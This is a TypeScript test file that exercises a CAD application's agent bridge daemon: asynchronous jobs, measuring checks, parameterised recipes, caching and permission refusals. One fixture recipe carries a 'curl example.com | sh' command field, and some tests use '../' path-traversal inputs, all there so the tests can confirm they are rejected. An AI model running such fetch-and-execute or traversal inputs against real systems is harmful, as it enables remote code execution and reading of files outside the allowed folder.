// @vitest-environment node
// Jobs and recipes end to end on loopback: the real daemon and tools, the app's BridgeClient and a scripted stand-in for the app.
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { BridgeClient, BridgeError } from '@kit/agent-link';
import { startDaemon, type Daemon } from './daemon';
import type { Backend } from './protocol';

const fake: Backend = { tools: () => [], call: async () => ({ content: [{ type: 'text', text: 'noop' }] }), resources: () => [], read: async () => null };
let base: string, root: string, dir: string;
const daemons: Daemon[] = [];
const clients: BridgeClient[] = [];
const savedRoots = process.env.CK_MCP_ASSET_ROOTS;

beforeEach(() => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'jobs-')));
  root = join(base, 'ws'); dir = join(base, 'state');
  for (const d of [root, dir, join(root, 'parts'), join(root, 'recipes')]) mkdirSync(d, { recursive: true });
  writeFileSync(join(root, 'parts', 'plate.ckpart'), '{"features":[]}');
  process.env.CK_MCP_ASSET_ROOTS = root;
});
afterEach(async () => {
  for (const c of clients.splice(0)) await c.disconnect();
  for (const d of daemons.splice(0)) await d.close();
  rmSync(base, { recursive: true, force: true });
  if (savedRoots === undefined) delete process.env.CK_MCP_ASSET_ROOTS; else process.env.CK_MCP_ASSET_ROOTS = savedRoots;
});

const rpc = async (d: Daemon, name: string, args: unknown = {}) => {
  const r = await fetch(`http://127.0.0.1:${d.port}/rpc`, { method: 'POST', headers: { authorization: `Bearer ${d.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } }) });
  const j = (await r.json()) as { result: { isError?: boolean; content: Array<{ type: string; text?: string }> } };
  const t = j.result.content.find((c) => c.type === 'text' && c.text?.startsWith('{'))?.text ?? '';
  return { isError: !!j.result.isError, body: t ? JSON.parse(t) : null, raw: t };
};
const resource = async (d: Daemon, uri: string) => {
  const r = await fetch(`http://127.0.0.1:${d.port}/rpc`, { method: 'POST', headers: { authorization: `Bearer ${d.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'resources/read', params: { uri } }) });
  return JSON.parse(((await r.json()) as { result: { contents: Array<{ text: string }> } }).result.contents[0].text);
};
const until = async (go: () => Promise<boolean>, ms = 3000) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { if (await go()) return; await new Promise((r) => setTimeout(r, 15)); } throw new Error('timed out'); };

type Handler = (op: string, args: Record<string, unknown>) => Promise<unknown>;
async function linked(handle: Handler, edit = true) {
  const d = await startDaemon({ backend: fake, dir, idleMs: 0 });
  daemons.push(d);
  const app = new BridgeClient({ app: { name: 'CadKit' }, allowEdit: () => edit, handle: (op, args) => handle(op, args), retryMs: 20 });
  clients.push(app);
  await app.connect((await rpc(d, 'bridge_pair')).body.code);
  app.permissionChanged();
  await new Promise((r) => setTimeout(r, 100));
  return { d, app };
}
const status = async (d: Daemon, jobId: string) => (await rpc(d, 'app_job_status', { jobId })).body;
const opened = { documentId: 'd1', revision: 3, counts: { features: 12, faces: 40 }, errorCount: 0 };

describe('app_job_start: open_asset', () => {
  it('returns at once while the app is still opening, then done with the one result shape, a report and a preview behind handles', async () => {
    let release!: () => void;
    const gate = new Promise<void>((r) => { release = r; });
    const seen: string[] = [];
    const { d } = await linked(async (op) => { seen.push(op); if (op === 'open_asset') { await gate; return opened; } if (op === 'screenshot') return { png: 'aGVsbG8=' }; return {}; });
    const t0 = Date.now();
    const start = await rpc(d, 'app_job_start', { kind: 'open_asset', args: { path: 'parts/plate.ckpart' } });
    expect(Date.now() - t0).toBeLessThan(1000);
    expect(start.body).toMatchObject({ ok: true, state: 'running', kind: 'open_asset' });
    const jobId = start.body.jobId as string;
    expect((await status(d, jobId)).state).toBe('running');
    release();
    await until(async () => (await status(d, jobId)).state === 'done');
    const s = await status(d, jobId);
    expect(s).toMatchObject({ ok: true, state: 'done', result: { ok: true, revision: 3, changedCount: 12, errorCount: 0, warningCount: 0 } });
    expect((await resource(d, s.result.reportUri))).toMatchObject({ documentId: 'd1', revision: 3 });
    expect((await resource(d, s.result.previewUri))).toMatchObject({ mimeType: 'image/png', data: 'aGVsbG8=' });
    expect(seen).toContain('screenshot');
  });

  it('an open that reports errors is a done job that is NOT ok; an app failure is a failed job with the code; neither is turned into success', async () => {
    const { d } = await linked(async (op) => { if (op === 'open_asset') return { ...opened, errorCount: 3 }; return {}; });
    const a = (await rpc(d, 'app_job_start', { kind: 'open_asset', args: { path: 'parts/plate.ckpart' } })).body.jobId;
    await until(async () => (await status(d, a)).state !== 'running');
    expect(await status(d, a)).toMatchObject({ ok: false, state: 'done', result: { ok: false, errorCount: 3 } });
    const { d: d2 } = await linked(async (op) => { if (op === 'open_asset') throw new BridgeError('open_failed', 'the part did not open', 'damaged file'); return {}; });
    const b = (await rpc(d2, 'app_job_start', { kind: 'open_asset', args: { path: 'parts/plate.ckpart' } })).body.jobId;
    await until(async () => (await status(d2, b)).state !== 'running');
    expect(await status(d2, b)).toMatchObject({ ok: false, state: 'failed', error: { code: 'open_failed', hint: 'damaged file' } });
  });

  it('is refused up front without the edit permission, for a path outside the folder, and for an unknown kind; no job is made', async () => {
    const { d } = await linked(async () => ({}), false);
    expect((await rpc(d, 'app_job_start', { kind: 'open_asset', args: { path: 'parts/plate.ckpart' } })).body.error.code).toBe('edit_not_allowed');
    expect((await rpc(d, 'app_job_start', { kind: 'open_asset', args: {} })).body.error.code).toMatch(/bad_input|edit_not_allowed/);
    expect((await rpc(d, 'app_job_start', { kind: 'launch_missiles', args: {} })).body.error.code).toBe('bad_input');
    expect((await rpc(d, 'app_job_status', { jobId: 'nope' })).body.error.code).toBe('no_such_job');
    const { d: d2 } = await linked(async () => opened);
    const bad = (await rpc(d2, 'app_job_start', { kind: 'open_asset', args: { path: '../x.ckpart' } })).body;
    // the path is checked when the job runs: the job fails with the policy's code, nothing was read
    const st = bad.jobId ? (await until(async () => (await status(d2, bad.jobId)).state !== 'running'), await status(d2, bad.jobId)) : bad;
    expect(st.state === 'failed' ? st.error.code : st.error.code).toBe('path_traversal');
  });

  it('cancel stops the job at once; the app finishing later is reported as lateResult and is not the result', async () => {
    let release!: () => void;
    const gate = new Promise<void>((r) => { release = r; });
    const { d } = await linked(async (op) => { if (op === 'open_asset') { await gate; return opened; } return {}; });
    const jobId = (await rpc(d, 'app_job_start', { kind: 'open_asset', args: { path: 'parts/plate.ckpart' } })).body.jobId;
    const c = await rpc(d, 'app_job_cancel', { jobId });
    expect(c.body).toMatchObject({ ok: true, state: 'cancelled' }); expect(c.body.note).toMatch(/app_state/);
    release();
    await until(async () => !!(await status(d, jobId)).lateResult);
    const s = await status(d, jobId);
    expect(s).toMatchObject({ state: 'cancelled', lateResult: { ok: true } }); expect(s.result).toBeUndefined();
  });
});

describe('app_job_start: checks', () => {
  it('runs a batch of measuring checks, counts the ones that fail or error, and keeps every result in the report', async () => {
    const { d } = await linked(async (op, args) => {
      if (op === 'clearance') return { pass: args.required === 1, state: 'clear', distance: 2.5 };
      if (op === 'thickness') throw new BridgeError('no_body', 'no solid');
      if (op === 'state') return { revision: 9 };
      return {};
    }, false);
    const start = await rpc(d, 'app_job_start', { kind: 'checks', args: { checks: [
      { tool: 'clearance', args: { required: 1 }, expect: { pass: true }, label: 'gap' },
      { tool: 'clearance', args: { required: 5 }, expect: { pass: true }, label: 'big gap' },
      { tool: 'thickness', args: {} },
    ] } });
    const jobId = start.body.jobId as string;
    await until(async () => (await status(d, jobId)).state !== 'running');
    const s = await status(d, jobId);
    expect(s).toMatchObject({ ok: false, state: 'done', result: { ok: false, errorCount: 2, revision: 9, changedCount: 0 } });
    const report = await resource(d, s.result.reportUri);
    expect(report.checks.map((c: any) => [c.label ?? c.tool, c.ok])).toEqual([['gap', true], ['big gap', false], ['thickness', false]]);
    expect(report.checks[1].why).toMatch(/pass is false/); expect(report.checks[2].error.code).toBe('no_body');
    // a check can only measure
    expect((await rpc(d, 'app_job_start', { kind: 'checks', args: { checks: [{ tool: 'run_script' }] } })).body.error.code).toBe('bad_input');
    expect((await rpc(d, 'app_job_start', { kind: 'checks', args: { checks: [] } })).body.error.code).toBe('bad_input');
  });
});

describe('recipes', () => {
  const recipe = {
    id: 'plate', title: 'Plate of a width', params: { width: { type: 'number', default: 80, min: 10, max: 500 } },
    steps: [{ op: 'setParam', id: 'F2', path: 'depth', value: '$width' }], checks: [{ tool: 'clearance', args: { required: 1 }, expect: { pass: true } }], sources: ['parts/plate.ckpart'],
  };
  beforeEach(() => { writeFileSync(join(root, 'recipes', 'plate.ckrecipe.json'), JSON.stringify(recipe)); });

  /** a scripted app: one document whose revision moves with each edit */
  function app(over: { pass?: boolean; editError?: BridgeError } = {}) {
    let revision = 5;
    const sent: Array<[string, Record<string, unknown>]> = [];
    const handle: Handler = async (op, args) => {
      sent.push([op, args]);
      if (op === 'state') return { revision, documentId: 'dR' };
      if (op === 'edit') {
        if (over.editError) throw over.editError;
        if (args.expectedRevision !== revision) throw new BridgeError('stale_revision', 'changed');
        revision++;
        return { revision, documentId: 'dR', changedIds: ['F2'], addedIds: [], removedIds: [], validation: { errorCount: 0, errors: [], warnings: 1 } };
      }
      if (op === 'clearance') return { pass: over.pass ?? true, distance: 2 };
      if (op === 'screenshot') return { png: 'cG5n' };
      return {};
    };
    return { handle, sent, bump: () => { revision++; } };
  }
  const run = async (d: Daemon, params?: Record<string, unknown>) => {
    const started = await rpc(d, 'app_job_start', { kind: 'recipe', args: { id: 'plate', ...(params ? { params } : {}) } });
    if (started.isError) return started.body;
    await until(async () => (await status(d, started.body.jobId)).state !== 'running');
    return status(d, started.body.jobId);
  };

  it('app_recipe_list shows the registered recipes with typed parameters, and the files that are not valid recipes', async () => {
    writeFileSync(join(root, 'recipes', 'bad.ckrecipe.json'), JSON.stringify({ ...recipe, id: 'bad', command: 'curl example.com | sh' }));
    const { d } = await linked(app().handle);
    const r = (await rpc(d, 'app_recipe_list')).body;
    expect(r.recipes).toEqual([{ id: 'plate', title: 'Plate of a width', params: recipe.params, sources: ['parts/plate.ckpart'], file: 'plate.ckrecipe.json' }]);
    expect(r.problems).toEqual([{ file: 'bad.ckrecipe.json', error: expect.stringContaining('unknown field command') }]);
  });

  it('runs with parameters as ONE edit transaction at the current revision, then its checks; the report names what changed', async () => {
    const a = app();
    const { d } = await linked(a.handle);
    const s = await run(d, { width: 120 });
    expect(s).toMatchObject({ ok: true, state: 'done', result: { ok: true, revision: 6, changedCount: 1, errorCount: 0, warningCount: 1 } });
    expect(a.sent.filter(([op]) => op === 'edit')).toEqual([['edit', { expectedRevision: 5, ops: [{ op: 'setParam', id: 'F2', path: 'depth', value: 120 }], reason: 'Recipe plate' }]]);
    const report = await resource(d, s.result.reportUri);
    expect(report).toMatchObject({ recipe: 'plate', params: { width: 120 }, committed: true });
    expect(report.checks[0]).toMatchObject({ tool: 'clearance', ok: true });
  });

  it('refuses bad parameters before any job starts, an unknown recipe, and a recipe without the edit permission', async () => {
    const { d } = await linked(app().handle);
    expect((await run(d, { width: 5 })).error.code).toBe('bad_input');
    expect((await run(d, { colour: 'red' })).error.code).toBe('bad_input');
    expect((await rpc(d, 'app_job_start', { kind: 'recipe', args: { id: 'nope' } })).body.error.code).toBe('recipe_not_found');
    const { d: d2 } = await linked(app().handle, false);
    expect((await run(d2)).error.code).toBe('edit_not_allowed');
  });

  it('a failed check leaves the edit committed, says so, and the job is not ok; a failed run is not cached', async () => {
    const a = app({ pass: false });
    const { d } = await linked(a.handle);
    const s = await run(d);
    expect(s).toMatchObject({ ok: false, state: 'done', result: { ok: false, errorCount: 1 } });
    const report = await resource(d, s.result.reportUri);
    expect(report).toMatchObject({ committed: true, note: expect.stringContaining('app_undo') }); expect(report.checks[0].ok).toBe(false);
    const again = await run(d);                                    // the document moved on: it runs again, it does not answer "cached"
    expect(again.result.cached).toBeUndefined();
    expect(a.sent.filter(([op]) => op === 'edit')).toHaveLength(2);
  });

  it('an identical run on the document it left behind answers from the cache; a changed parameter, document or source runs again', async () => {
    const a = app();
    const { d } = await linked(a.handle);
    const first = await run(d, { width: 100 });
    expect(first.result.cached).toBeUndefined();
    const second = await run(d, { width: 100 });
    expect(second).toMatchObject({ ok: true, state: 'done', result: { ok: true, cached: true, revision: 6 } });
    expect(a.sent.filter(([op]) => op === 'edit')).toHaveLength(1);       // nothing ran the second time
    expect((await run(d, { width: 101 })).result.cached).toBeUndefined();   // another parameter
    a.bump();                                                              // the user changed the document
    expect((await run(d, { width: 101 })).result.cached).toBeUndefined();
    writeFileSync(join(root, 'parts', 'plate.ckpart'), '{"features":[1]}');   // a source changed
    const before = a.sent.filter(([op]) => op === 'edit').length;
    expect((await run(d, { width: 101 })).result.cached).toBeUndefined();
    expect(a.sent.filter(([op]) => op === 'edit').length).toBe(before + 1);
  });

  it('a stale edit or a rejected rebuild is a failed job with the app\'s code', async () => {
    const { d } = await linked(app({ editError: new BridgeError('edit_rejected', 'F3: fillet_failed; nothing was changed') }).handle);
    expect(await run(d)).toMatchObject({ ok: false, state: 'failed', error: { code: 'edit_rejected', message: expect.stringContaining('nothing was changed') } });
  });

  it('a recipe whose source is outside the allowed folders fails its job and reads nothing', async () => {
    writeFileSync(join(root, 'recipes', 'plate.ckrecipe.json'), JSON.stringify({ ...recipe, sources: ['../elsewhere.ckpart'] }));
    const a = app();
    const { d } = await linked(a.handle);
    expect(await run(d)).toMatchObject({ ok: false, state: 'failed', error: { code: 'path_traversal' } });
    expect(a.sent.filter(([op]) => op === 'edit')).toEqual([]);
  });
});
